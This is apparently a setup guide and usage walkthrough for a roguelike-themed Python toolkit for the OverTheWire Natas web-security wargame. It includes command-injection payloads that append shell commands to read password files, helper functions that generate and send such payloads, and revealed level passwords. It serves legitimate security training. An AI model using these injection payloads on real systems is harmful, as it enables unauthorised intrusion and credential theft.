# 🗡️ Natas Roguelike Loadout Setup

Quick setup guide for auto-equipping your Natas wargame utilities in iSH.

## ⚡ Quick Start

### Option 1: Use from Current Directory (Recommended)

```bash
# Navigate to a-shell directory
cd ~/Documents/Couch.Potato/pythonista-lab/ios/a-shell

# Start Python with auto-equipped inventory
PYTHONSTARTUP=.pythonrc python3
```

You'll see:
```
✨ Roguelike loadout auto-equipped!
📦 Available utilities:
   🛡️  probe(), cloak_of_resilience
   🧪 reveal_vial(), brew_vial()
   🏹 sling_payload(), forge_bullets()
   🗺️  scout_room(), extract_loot()
   📖 scribe()
   ⚡ Quick: natas_auth(), natas_url(), quick_scout(), quick_run()

>>>
```

Now you can immediately use:
```python
>>> auth = natas_auth(0, 'natas0')
>>> url = natas_url(0)
>>> findings = quick_scout(0, 'natas0')
```

### Option 2: Permanent Auto-Equip

Make the inventory available in every Python session:

```bash
# Add to your shell profile (~/.profile or ~/.bashrc in iSH):
echo 'export PYTHONSTARTUP=~/Documents/Couch.Potato/pythonista-lab/ios/a-shell/.pythonrc' >> ~/.profile

# Reload your shell
source ~/.profile

# Now every Python session auto-loads the inventory
python3
```

### Option 3: Home Directory Install

```bash
# Copy to home directory for easy access
cp ~/Documents/Couch.Potato/pythonista-lab/ios/a-shell/.pythonrc ~/.pythonrc

# Set environment variable
echo 'export PYTHONSTARTUP=~/.pythonrc' >> ~/.profile
source ~/.profile
```

## 🎮 Usage Examples

### Natas Level 0

```python
# The loadout is already equipped!
>>> auth = natas_auth(0, 'natas0')
>>> url = natas_url(0)
>>> findings = scout_room(url, auth)

🗺️  [Scouting Room]...
📋 Forms found: 0
📝 Inputs found: 0
💬 Comments found: 1
🔗 Links found: 3
📜 Scripts found: 0

💬 HTML Comments:
   The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6...

>>> loot = extract_loot(findings['comments'][0])
💰 [Loot Found]: 1 items
   g9D9cREhslqBKtcA2uocGHPfMZVzeFK6

>>> scribe(0, 'g9D9cREhslqBKtcA2uocGHPfMZVzeFK6', 'Found in HTML comment')
📖 [Scribed to Journal]: Level 0
```

### Natas Level 8: Decode the Secret

```python
>>> encoded = '3d3d516343746d4d6d6c315669563362'
>>> reveal_vial(encoded, mode='natas8')
🧪 [Natas 8 Potion]: oubWYf2kBq

>>> scribe(8, 'oubWYf2kBq', 'Natas8 encoding: reverse -> hex decode -> base64 decode')
```

### Natas Level 9: Command Injection

```python
>>> auth = natas_auth(9, 'your_natas9_password')
>>> url = natas_url(9)

# Forge injection payloads
>>> bullets = forge_bullets('cat /etc/natas_webpass/natas10', wrapper='grep')
>>> bullets
['; cat /etc/natas_webpass/natas10 #',
 "'' ; cat /etc/natas_webpass/natas10 #",
 'dictionary.txt ; cat /etc/natas_webpass/natas10 #']

# Test first bullet
>>> result = sling_payload(url, auth, bullets[0])
🏹 [Slinging]: ; cat /etc/natas_webpass/natas10 #
🎯 [Hit Confirmed]: 1543 bytes received

>>> loot = extract_loot(result)
💰 [Loot Found]: 1 items
   D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

>>> scribe(9, 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE', 'Command injection via grep parameter')
```

### Natas Level 10: Filtered Injection

```python
# Level 10 filters ; | & characters
>>> auth = natas_auth(10, 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE')
>>> url = natas_url(10)

# Use grep's file argument to read password file directly
>>> bullet = '.* /etc/natas_webpass/natas11 #'
>>> result = quick_run(10, 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE', bullet)
>>> loot = extract_loot(result)
```

### Auto-Decode Mystery Data

```python
>>> mystery = 'aHR0cHM6Ly9leGFtcGxlLmNvbS9hcGkva2V5'
>>> reveal_vial(mystery, mode='auto')

🧪 [Potion Brewing]: Trying all decodings...

✅ Base64: https://example.com/api/key
❌ Hex: Failed
✅ URL: aHR0cHM6Ly9leGFtcGxlLmNvbS9hcGkva2V5
❌ ROT13: Failed
```

## 🛠️ Advanced Workflows

### Interactive Dungeon Crawling

```python
# Scout the level
>>> findings = quick_scout(15, 'current_password')

# Analyze the map
>>> for comment in findings['comments']:
...     print(comment)

# Test payloads
>>> for bullet in forge_bullets('cat secret.txt', 'basic'):
...     result = sling_payload(url, auth, bullet)
...     if 'natas' in result:
...         print(f"Success with: {bullet}")
...         break

# Extract and record loot
>>> loot = extract_loot(result)
>>> scribe(15, loot[0], 'SQL injection in login form')
```

### Custom Payload Crafting

```python
# Create custom encoding
>>> payload = 'admin'
>>> encoded = brew_vial(payload, mode='base64')
>>> encoded
'YWRtaW4='

# Double encoding
>>> double = brew_vial(encoded, mode='url')
>>> double
'YWRtaW4%3D'
```

## 📖 Your Journal

All progress is automatically saved to:
```
~/Documents/BugBounty/natas_journal.md
```

View your journal:
```bash
cat ~/Documents/BugBounty/natas_journal.md
```

## 🎯 Utility Reference

### The Cloak (Protection)
- `probe(url, auth, params, data, method, headers)` - Resilient HTTP request
- `@cloak_of_resilience` - Decorator to absorb errors

### The Potion (Decoding)
- `reveal_vial(data, mode='auto')` - Decode base64/hex/url/rot13/natas8
- `brew_vial(data, mode='base64')` - Encode data

### The Weapon (Injection)
- `sling_payload(base_url, auth, bullet, param='needle')` - Inject payload
- `forge_bullets(command, wrapper='basic')` - Generate payload variations

### The Map (Recon)
- `scout_room(url, auth)` - Analyze page for forms/inputs/comments/links/scripts
- `extract_loot(text, pattern)` - Find passwords in response

### The Journal (Progress)
- `scribe(level, password, notes)` - Record victory

### Quick Helpers
- `natas_auth(level, password)` - Create auth tuple
- `natas_url(level)` - Generate level URL
- `quick_scout(level, password)` - One-liner recon
- `quick_run(level, password, bullet)` - One-liner attack

## 🎮 Tips

1. **Start with scouting**: Always `quick_scout()` first to understand the level
2. **Check comments**: Many Natas levels hide clues in HTML comments
3. **Forge variations**: Use `forge_bullets()` to try multiple injection techniques
4. **Journal everything**: Call `scribe()` after each success for future reference
5. **Test locally**: Use `probe()` to test requests before crafting exploits

## 🔒 Natas Access

**URL**: http://natas0.natas.labs.overthewire.org
**Username**: natas0
**Password**: natas0

Each level's password is the username for the next level.

## 🚀 Happy Dungeon Crawling!

Turn OverTheWire's Natas into a tactical roguelike adventure! 🗡️🛡️🧪
